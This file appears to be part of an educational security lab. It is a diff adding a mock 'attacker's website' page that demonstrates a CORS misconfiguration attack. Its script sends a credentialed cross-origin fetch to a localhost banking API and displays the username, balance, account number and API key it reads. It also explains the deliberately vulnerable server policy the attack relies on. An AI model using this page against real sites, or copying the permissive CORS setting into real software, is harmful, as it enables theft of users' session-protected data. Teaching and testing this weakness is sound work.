@@ -1,0 +1,344 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Attacker's Website - CORS Demo</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            max-width: 900px;
+            margin: 50px auto;
+            padding: 20px;
+            background: linear-gradient(135deg, #1a1a1a 0%, #2d1a1a 100%);
+            color: #fff;
+            min-height: 100vh;
+        }
+        .container {
+            background: #2d2d2d;
+            border: 3px solid #dc3545;
+            border-radius: 12px;
+            padding: 40px;
+            box-shadow: 0 10px 40px rgba(220, 53, 69, 0.4);
+        }
+        h1 {
+            color: #dc3545;
+            margin-top: 0;
+            text-align: center;
+            font-size: 2.5em;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+        }
+        .skull {
+            font-size: 64px;
+            text-align: center;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        .warning {
+            background: linear-gradient(135deg, #dc3545 0%, #bb2d3b 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            border: 2px solid #fff;
+        }
+        .info {
+            background: linear-gradient(135deg, #0d6efd 0%, #0a58ca 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+        }
+        .config {
+            background: #333;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border-left: 4px solid #ffc107;
+        }
+        .config label {
+            display: block;
+            color: #ffc107;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        .config input {
+            width: 100%;
+            padding: 10px;
+            border: 2px solid #555;
+            border-radius: 5px;
+            background: #222;
+            color: #fff;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+        }
+        button {
+            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 4px 15px rgba(220, 53, 69, 0.4);
+            transition: all 0.3s ease;
+        }
+        button:hover {
+            background: linear-gradient(135deg, #c82333 0%, #bd2130 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(220, 53, 69, 0.6);
+        }
+        button:active {
+            transform: translateY(0);
+        }
+        #loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+            background: #333;
+            border-radius: 8px;
+            margin-top: 20px;
+            border-left: 4px solid #0d6efd;
+        }
+        #result {
+            margin-top: 20px;
+            padding: 20px;
+            background: #1a4d1a;
+            border-left: 4px solid #28a745;
+            border-radius: 8px;
+            display: none;
+            white-space: pre-wrap;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        #error {
+            margin-top: 20px;
+            padding: 20px;
+            background: #4d3d1a;
+            border-left: 4px solid #ffc107;
+            border-radius: 8px;
+            display: none;
+            color: #ffc107;
+            line-height: 1.6;
+        }
+        code {
+            background: #444;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            color: #ffc107;
+        }
+        .footer {
+            margin-top: 40px;
+            font-size: 13px;
+            color: #888;
+            text-align: center;
+            padding: 20px;
+            border-top: 1px solid #444;
+        }
+        .origin-display {
+            background: #444;
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 10px;
+            text-align: center;
+            font-family: 'Courier New', monospace;
+            color: #ffc107;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="skull">💀</div>
+        <h1>Evil Attacker's Website</h1>
+        
+        <div class="warning">
+            <strong>⚠️ This is a simulated attack page!</strong><br>
+            This page demonstrates how CORS misconfiguration allows cross-origin attacks.
+            You are now on <strong>attacker's domain</strong> (different port = different origin).
+        </div>
+
+        <div class="info">
+            <strong>How this attack works:</strong><br>
+            1. Victim (you) is logged into the legitimate application<br>
+            2. Victim visits this malicious website (e.g., via phishing)<br>
+            3. This page makes a request to the victim's API<br>
+            4. Browser automatically includes session cookies<br>
+            5. If CORS is misconfigured, attacker reads the response<br>
+            6. Sensitive data (balance, API keys) is stolen!
+        </div>
+
+        <div class="config">
+            <label>Target API URL:</label>
+            <input type="text" id="targetUrl" placeholder="https://localhost:7124/api/user/balance">
+            <div class="origin-display">
+                Your current origin: <strong id="currentOrigin"></strong>
+            </div>
+        </div>
+
+        <button onclick="stealData()">
+            Steal Victim's Data
+        </button>
+        
+        <div id="loading">
+            <strong>Sending cross-origin request...</strong><br>
+            <small>Browser is including victim's cookies automatically!</small>
+        </div>
+
+        <div id="result"></div>
+        <div id="error"></div>
+
+        <div class="footer">
+            This is a controlled demonstration for educational purposes.<br>
+            No real data is being stolen. This simulates a real CORS attack scenario.
+        </div>
+    </div>
+
+    <script>
+        // Display current origin
+        document.getElementById('currentOrigin').textContent = window.location.origin;
+
+        // Set default target URL - correct endpoint
+        const defaultTarget = 'https://localhost:7124/api/user/balance';
+        document.getElementById('targetUrl').value = defaultTarget;
+
+        async function stealData() {
+            const targetUrl = document.getElementById('targetUrl').value.trim();
+            const resultDiv = document.getElementById('result');
+            const errorDiv = document.getElementById('error');
+            const loadingDiv = document.getElementById('loading');
+
+            if (!targetUrl) {
+                errorDiv.textContent = 'Please enter a target URL';
+                errorDiv.style.display = 'block';
+                return;
+            }
+
+            resultDiv.style.display = 'none';
+            errorDiv.style.display = 'none';
+            loadingDiv.style.display = 'block';
+
+            try {
+                console.log('=== CORS ATTACK ATTEMPT ===');
+                console.log('Attacker origin:', window.location.origin);
+                console.log('Target URL:', targetUrl);
+                console.log('Target origin:', new URL(targetUrl).origin);
+                console.log('Making cross-origin request with credentials...');
+
+                const response = await fetch(targetUrl, {
+                    method: 'GET',
+                    credentials: 'include', // CRITICAL: Includes victim's cookies!
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    mode: 'cors' // Explicitly request CORS
+                });
+
+                console.log('Response status:', response.status);
+                console.log('Response headers:', [...response.headers.entries()]);
+
+                loadingDiv.style.display = 'none';
+
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+                }
+
+                const data = await response.json();
+
+                // Success - CORS misconfiguration exploited!
+                resultDiv.textContent = 
+                    'CORS MISCONFIGURATION EXPLOITED!\n\n' +
+                    'Attack Successful! Cross-origin request succeeded!\n\n' +
+                    '═══════════════════════════════════════\n' +
+                    'ATTACK DETAILS:\n' +
+                    '═══════════════════════════════════════\n' +
+                    'Attacker origin: ' + window.location.origin + '\n' +
+                    'Target origin:   ' + new URL(targetUrl).origin + '\n' +
+                    'Different origins! This should be BLOCKED!\n\n' +
+                    '═══════════════════════════════════════\n' +
+                    'STOLEN SENSITIVE DATA:\n' +
+                    '═══════════════════════════════════════\n\n' +
+                    JSON.stringify(data, null, 2) + '\n\n' +
+                    '═══════════════════════════════════════\n' +
+                    'EXTRACTED INFORMATION:\n' +
+                    '═══════════════════════════════════════\n' +
+                    'Username:        ' + (data.username || 'N/A') + '\n' +
+                    'Account Balance: $' + (data.accountBalance || 'N/A') + '\n' +
+                    'Account Number:  ' + (data.accountNumber || 'N/A') + '\n' +
+                    'API Key:         ' + (data.apiKey || 'N/A') + '\n\n' +
+                    '═══════════════════════════════════════\n' +
+                    'WHAT THE ATTACKER CAN DO NOW:\n' +
+                    '═══════════════════════════════════════\n' +
+                    '✓ Access user\'s financial information\n' +
+                    '✓ Steal account credentials and API keys\n' +
+                    '✓ View transaction history\n' +
+                    '✓ Potentially transfer funds\n' +
+                    '✓ Impersonate the user\n' +
+                    '✓ Access all protected resources\n\n' +
+                    ' Exfiltrating data to attacker\'s server...\n' +
+                    ' Data sent successfully!\n\n' +
+                    '═══════════════════════════════════════\n' +
+                    'WHY THIS ATTACK WORKED:\n' +
+                    '═══════════════════════════════════════\n' +
+                    '• Server used SetIsOriginAllowed(_ => true)\n' +
+                    '• Server set Access-Control-Allow-Origin to attacker origin\n' +
+                    '• Server set Access-Control-Allow-Credentials: true\n' +
+                    '• Browser sent cookies with the request\n' +
+                    '• Browser allowed JavaScript to read the response\n' +
+                    '• Same-Origin Policy was completely bypassed!\n\n' +
+                    ' This is a critical security vulnerability!';
+
+                resultDiv.style.display = 'block';
+
+                // Log to console for demonstration
+                console.log('ATTACK SUCCESSFUL! Stolen data:', data);
+
+            } catch (error) {
+                loadingDiv.style.display = 'none';
+                
+                console.error('❌ Attack failed:', error);
+                console.log('This is likely due to:', error.message);
+                
+                errorDiv.textContent = 
+                    '✅ Attack Failed - CORS Protection Working!\n\n' +
+                    '═══════════════════════════════════════\n' +
+                    'ERROR DETAILS:\n' +
+                    '═══════════════════════════════════════\n' +
+                    'Error: ' + error.message + '\n\n' +
+                    'The cross-origin request was blocked!\n\n' +
+                    '═══════════════════════════════════════\n' +
+                    'POSSIBLE REASONS:\n' +
+                    '═══════════════════════════════════════\n' +
+                    '✓ CORS is properly configured\n' +
+                    '✓ Origin ' + window.location.origin + ' is not whitelisted\n' +
+                    '✓ Credentials are not allowed from this origin\n' +
+                    '✓ Browser enforced Same-Origin Policy\n' +
+                    '✓ Server rejected the preflight request\n\n' +
+                    '═══════════════════════════════════════\n' +
+                    'TROUBLESHOOTING:\n' +
+                    '═══════════════════════════════════════\n' +
+                    '1. Check browser console (F12) for CORS errors\n' +
+                    '2. Verify the target API is running on https://localhost:7124\n' +
+                    '3. Ensure Program.cs has VulnerablePolicy configured\n' +
+                    '4. Check that UseCors("VulnerablePolicy") is called\n' +
+                    '5. Verify controller has [EnableCors("VulnerablePolicy")]\n\n' +
+                    'This is GOOD if intentional - the API is protected!\n' +
+                    'The server correctly rejected the cross-origin request.\n\n' +
+                    '⚠️  For this demo to work, the vulnerable CORS policy\n' +
+                    '    must be enabled in the target application.';
+                    
+                errorDiv.style.display = 'block';
+            }
+        }
+    </script>
+</body>
+</html>
